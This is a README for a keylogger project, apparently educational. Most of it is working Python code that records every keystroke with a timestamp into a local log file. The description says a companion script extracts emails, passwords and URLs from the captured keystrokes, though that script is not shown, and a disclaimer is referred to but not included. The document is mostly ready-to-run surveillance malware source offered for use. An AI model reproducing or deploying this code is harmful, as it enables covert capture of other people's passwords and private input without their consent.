# Keylogger


## What is a keylogger?
This is a keylogger script to be able to log any key strokes. Then another script for analysis. This analysis script will detect and find any patterns that relate to emails, passwords, and URLs. As well as the most common word typed. Please read the Disclaimer to use properly.


```
from pynput.keyboard import Listener
import time
import os

# File to extract logs into
log_file = "raw_log.txt"

# Check if file exists, then creats/writes into the file. Extracting the time when the keylogger is activated
if not os.path.exists(log_file):
    with open(log_file, "w") as file:
        file.write("Keylogger started at: {}\n".format(time.ctime()))

# Function called with every key pressed, logs it into file with that current timestamp
def on_press(key):
    try:
        with open(log_file, "a") as file:
            file.write("{0} - {1}\n".format(time.ctime(), key.char))
    except AttributeError:
        with open(log_file, "a") as file:
            file.write("{0} - {1}\n".format(time.ctime(), key))
        
        # Break zone, when esc key is entered, the keylogger stops
        if key == key.esc:
            return False

# Enables input from keyboard
with Listener(on_press=on_press) as listener:
    listener.join()
